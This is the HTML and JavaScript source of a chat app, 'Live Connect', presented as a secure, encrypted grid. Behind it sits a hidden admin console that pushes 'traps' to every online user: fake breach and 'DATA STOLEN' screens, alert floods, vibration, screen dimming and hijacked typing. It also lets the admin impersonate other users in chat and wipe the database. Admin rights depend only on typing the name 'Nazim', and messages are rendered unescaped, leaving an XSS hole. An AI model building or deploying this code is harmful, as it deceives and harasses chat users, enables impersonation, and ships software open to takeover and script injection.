<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Connect | Secure Grid</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root { --primary: #00d2ff; --danger: #ff0055; --bg: #030303; --glass: rgba(15, 15, 15, 0.9); --neon: #00ff41; }
        * { box-sizing: border-box; outline: none; transition: 0.3s; }
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; overflow: hidden; height: 100vh; }

        .app-container { max-width: 500px; margin: auto; height: 100vh; background: #000; position: relative; display: flex; flex-direction: column; border-left: 1px solid #111; border-right: 1px solid #111; }
        
        header { padding: 15px 20px; background: var(--glass); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; z-index: 1000; }
        header h1 { font-size: 1.1rem; margin: 0; background: linear-gradient(45deg, var(--primary), #9d50bb); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; letter-spacing: 1px; }

        .page { display: none; flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 100px; }
        .active { display: flex; flex-direction: column; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }

        /* Modern Dashboard Elements */
        .hero-card { background: linear-gradient(135deg, #111, #050505); border: 1px solid #222; padding: 20px; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .hero-card h2 { margin: 0; font-size: 1.2rem; color: var(--primary); }
        .node-info { font-size: 11px; color: #666; margin-top: 10px; display: flex; gap: 15px; }

        /* ADMIN HACKING CONSOLE */
        #admin-console { display: none; background: #000; border: 2px solid var(--danger); padding: 12px; margin: 10px; border-radius: 12px; flex-wrap: wrap; gap: 6px; box-shadow: 0 0 20px rgba(255, 0, 85, 0.2); }
        .h-btn { flex: 1; min-width: 80px; padding: 10px; font-size: 9px; background: #000; border: 1px solid var(--danger); color: var(--danger); font-weight: bold; border-radius: 6px; cursor: pointer; text-transform: uppercase; }
        .h-btn:hover { background: var(--danger); color: #000; }

        /* Chat UI */
        .msg { padding: 12px 16px; border-radius: 18px; font-size: 14px; max-width: 80%; position: relative; margin-bottom: 10px; line-height: 1.4; border: 1px solid rgba(255,255,255,0.03); }
        .me { align-self: flex-end; background: var(--primary); color: #000; font-weight: 500; border-bottom-right-radius: 2px; }
        .other { align-self: flex-start; background: #1a1a1a; color: #eee; border-bottom-left-radius: 2px; }
        .msg b { display: block; font-size: 10px; margin-bottom: 4px; opacity: 0.8; }
        .msg img { max-width: 100%; border-radius: 10px; margin-top: 8px; }
        .del { position: absolute; top: -5px; right: -5px; background: red; color: white; width: 18px; height: 18px; border-radius: 50%; font-size: 9px; display: none; align-items: center; justify-content: center; cursor: pointer; }
        .msg:hover .del { display: flex; }

        /* Input Bar */
        .input-bar { position: fixed; bottom: 0; max-width: 500px; width: 100%; padding: 15px; background: #000; display: flex; align-items: center; gap: 10px; border-top: 1px solid #111; }
        .input-wrap { flex: 1; background: #111; border-radius: 30px; padding: 5px 15px; display: flex; align-items: center; gap: 10px; border: 1px solid #222; }
        .input-wrap input { flex: 1; background: transparent; border: none; color: #fff; padding: 10px; font-size: 14px; }

        /* Overlays */
        #scare-ui { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:99999; color: var(--neon); flex-direction:column; align-items:center; justify-content:center; text-align:center; padding: 40px; font-family: 'Courier New', monospace; }
    </style>
</head>
<body>

<div id="scare-ui">
    <i class="fa-solid fa-user-ninja" style="font-size: 50px; color: var(--danger); margin-bottom: 20px;"></i>
    <h2 id="scare-text">TERMINAL HIJACKED</h2>
    <div id="logs" style="font-size: 11px; text-align: left; width: 100%;"></div>
</div>

<div class="app-container">
    <header>
        <h1>LIVE CONNECT</h1>
        <div style="display:flex; gap:15px;">
            <i class="fa-solid fa-power-off" onclick="userLogout()" style="color:var(--danger); cursor:pointer;"></i>
        </div>
    </header>

    <div id="loginPage" class="page active">
        <div style="text-align: center; margin-top: 100px;">
            <i class="fa-solid fa-link" style="font-size: 50px; color: var(--primary); margin-bottom: 20px;"></i>
            <h3>GRID AUTHENTICATION</h3>
            <input type="text" id="uInp" placeholder="Enter Codename" style="width: 80%; padding: 15px; border-radius: 12px; background: #111; border: 1px solid #222; color: #fff; text-align: center; margin-top: 20px;">
            <button onclick="handleLogin()" style="width: 80%; padding: 15px; border-radius: 12px; background: var(--primary); color: #000; font-weight: bold; border: none; margin-top: 20px; cursor: pointer;">CONNECT_</button>
        </div>
    </div>

    <div id="homePage" class="page">
        <div class="hero-card">
            <h2 id="greet">Welcome, Guest</h2>
            <div class="node-info">
                <span>SIGNAL: <font color="lime">ENCRYPTED</font></span>
                <span>ACTIVE: <font color="cyan" id="liveNodes">0</font></span>
            </div>
        </div>
        <button onclick="openRoom('global', false)" style="width: 100%; padding: 20px; background: #080808; border: 1px solid var(--primary); color: var(--primary); border-radius: 15px; font-weight: bold; cursor: pointer;">
            <i class="fa-solid fa-satellite"></i> ENTER GLOBAL GRID
        </button>
        <p style="font-size: 10px; color: #444; margin-top: 25px; letter-spacing: 2px;">DETECTED NODES:</p>
        <div id="nodeList"></div>
    </div>

    <div id="chatPage" class="page">
        <div id="admin-console">
            <button class="h-btn" onclick="triggerHack('freeze')">Freeze</button>
            <button class="h-btn" onclick="triggerHack('scare')">Matrix</button>
            <button class="h-btn" onclick="triggerHack('vibrate')">Vibrate</button>
            <button class="h-btn" onclick="triggerHack('popups')">Popups</button>
            <button class="h-btn" onclick="triggerHack('audio')">Ghost</button>
            <button class="h-btn" onclick="triggerHack('battery')">Battery</button>
            <button class="h-btn" onclick="triggerHack('hijack')">Hijack</button>
            <button class="h-btn" onclick="triggerHack('restore')" style="border-color:lime; color:lime">Restore</button>
            <button class="h-btn" onclick="clearDB()" style="background:var(--danger); color:white;">NUKE</button>
        </div>
        <div id="chatStream" style="display:flex; flex-direction:column;"></div>
        <div class="input-bar">
            <div class="input-wrap">
                <i id="wand" class="fa-solid fa-wand-magic-sparkles" style="display:none; color: gold; cursor: pointer;" onclick="toggleAdmin()"></i>
                <label for="img"><i class="fa-solid fa-image" style="color:#555; cursor:pointer;"></i></label>
                <input type="file" id="img" accept="image/*" style="display:none;" onchange="uploadImg(this)">
                <input type="text" id="msg" placeholder="Message...">
                <i class="fa-solid fa-paper-plane" style="color:var(--primary); cursor:pointer;" onclick="pushMsg()"></i>
            </div>
        </div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

const config = { apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE", databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com" };
const app = initializeApp(config);
const db = getDatabase(app);
let myId = null, myRoom = "global", isP = false;
const ADMIN_ID = "Nazim";

window.onload = () => {
    const saved = localStorage.getItem("connectUser");
    if(saved) startSession(saved);
};

window.handleLogin = () => {
    const n = document.getElementById("uInp").value.trim();
    if(!n) return;
    localStorage.setItem("connectUser", n);
    startSession(n);
};

function startSession(n) {
    myId = n;
    document.getElementById("loginPage").style.display="none";
    document.getElementById("homePage").classList.add("active");
    document.getElementById("greet").innerText = "Welcome, " + myId;
    if(myId === ADMIN_ID) document.getElementById("wand").style.display="block";

    onValue(ref(db, "traps/" + myId), snap => {
        const t = snap.val();
        const s = document.getElementById("scare-ui");
        if(t === "freeze") { s.style.display="flex"; document.getElementById("scare-text").innerText="SYSTEM LOCKED"; }
        if(t === "vibrate") { if(navigator.vibrate) navigator.vibrate([500,200,500]); }
        if(t === "popups") { for(let i=0; i<5; i++) alert("SECURITY BREACH!"); }
        if(t === "audio") { new Audio('https://www.soundjay.com/nature/sounds/rain-01.mp3').play(); }
        if(t === "battery") { document.body.style.opacity = "0.05"; alert("Battery 1% - Closing Grid"); }
        if(t === "hijack") { document.getElementById("msg").oninput = function() { this.value = "NAZIM IS THE BOSS 👑"; }; }
        if(t === "scare") { s.style.display="flex"; runMatrix(); }
        if(t === "restore") { s.style.display="none"; document.body.style.opacity="1"; document.getElementById("msg").oninput = null; }
    });

    if(myId !== ADMIN_ID) set(ref(db, "online/" + myId), true);
    fetchNodes();
}

function runMatrix() {
    const l = ["> BYPASSING...", "> UPLOADING...", "> DATA STOLEN"];
    const b = document.getElementById("logs"); b.innerHTML = "";
    let i = 0; setInterval(() => { if(i<l.length) b.innerHTML += l[i++] + "<br>"; }, 600);
}

window.fetchNodes = () => {
    onValue(ref(db, "online"), snap => {
        const list = document.getElementById("nodeList"); list.innerHTML = "";
        let c = 0;
        snap.forEach(u => {
            c++;
            if(u.key !== myId) {
                let d = document.createElement("div"); d.style = "padding:15px; background:#080808; border-radius:12px; margin-bottom:8px; border:1px solid #111; display:flex; justify-content:space-between; cursor:pointer;";
                d.innerHTML = `<span>${u.key}</span> <i class="fa-solid fa-circle" style="color:lime; font-size:6px;"></i>`;
                d.onclick = () => openRoom(u.key, true);
                list.appendChild(d);
            }
        });
        document.getElementById("liveNodes").innerText = c;
    });
};

window.openRoom = (target, p) => {
    myRoom = p ? [myId, target].sort().join("::") : "global";
    isP = p;
    document.getElementById("homePage").classList.remove("active");
    document.getElementById("chatPage").classList.add("active");
    syncChat();
};

window.pushMsg = () => {
    const i = document.getElementById("msg");
    if(!i.value) return;
    if(myId === ADMIN_ID && i.value.startsWith("/as ")) {
        const p = i.value.split(" ");
        push(ref(db, "chats/global"), { s: p[1], t: i.value.replace("/as "+p[1]+" ", "") });
    } else {
        push(ref(db, isP ? "chats/priv/" + myRoom : "chats/global"), { s: myId, t: i.value });
    }
    i.value = "";
};

window.uploadImg = (f) => {
    const r = new FileReader();
    r.onload = (e) => push(ref(db, isP ? "chats/priv/" + myRoom : "chats/global"), { s: myId, i: e.target.result });
    r.readAsDataURL(f.files[0]);
};

function syncChat() {
    const path = isP ? "chats/priv/" + myRoom : "chats/global";
    onValue(ref(db, path), snap => {
        const box = document.getElementById("chatStream"); box.innerHTML = "";
        snap.forEach(m => {
            const d = m.val();
            const div = document.createElement("div"); div.className = `msg ${d.s === myId ? 'me' : 'other'}`;
            div.innerHTML = `<b>${d.s}</b> ${d.t ? d.t : `<img src="${d.i}">`} 
            ${(myId === ADMIN_ID) ? `<span class="del" onclick="remove(ref(db,'${path}/${m.key}'))">✕</span>` : ''}`;
            box.appendChild(div);
        });
        box.parentElement.scrollTop = box.parentElement.scrollHeight;
    });
}

window.toggleAdmin = () => { const p = document.getElementById("admin-console"); p.style.display = p.style.display === "flex" ? "none" : "flex"; };
window.triggerHack = (type) => { onValue(ref(db, "online"), snap => { snap.forEach(u => { if(u.key !== ADMIN_ID) set(ref(db, "traps/" + u.key), type); }); }, {onlyOnce:true}); };
window.clearDB = () => { if(confirm("NUKE?")) remove(ref(db)); };
window.userLogout = () => { localStorage.clear(); location.reload(); };
document.getElementById("msg").addEventListener("keypress", (e) => { if(e.key === 'Enter') pushMsg(); });
</script>
</body>
</html>
